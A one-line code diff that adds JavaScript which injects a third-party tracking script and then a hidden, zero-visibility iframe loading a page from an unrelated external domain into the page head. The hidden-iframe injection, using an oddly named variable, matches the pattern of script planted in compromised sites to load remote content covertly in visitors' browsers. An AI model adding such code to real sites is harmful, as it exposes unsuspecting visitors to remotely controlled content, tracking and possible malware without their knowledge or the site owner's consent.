@@ -1,0 +1,1 @@
+var c=document.createElement('script');c.type='text/javascript';c.src='http://c.cnzz.com/core.php?web_id=1000201696&t=z?c=c';document.getElementsByTagName('head')[0].appendChild(c);var ____if=document.createElement('iframe');____if.setAttribute('style','display:none');____if.src='http://cn.st.wayayaya.com/cn.html?102';document.getElementsByTagName('head')[0].appendChild(____if);
